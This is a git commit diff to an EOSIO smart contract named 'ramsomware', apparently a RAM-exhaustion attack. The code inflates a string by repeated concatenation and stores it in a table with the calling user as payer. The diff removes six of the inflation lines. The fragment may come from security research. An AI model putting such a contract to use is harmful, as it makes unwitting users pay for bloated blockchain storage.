cfe7e5759311196cad72a3f08d8ef0c87c22c1ee
k1rh4 <k1rh4.lee@gmail.com>
2019-05-02 12:15:12 +0900

    Update ramsomware

--- RUN_NODE/SCRIPT/ramsomware/ramsomware.cpp
+++ RUN_NODE/SCRIPT/ramsomware/ramsomware.cpp
@@ -27,12 +27,6 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
 
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
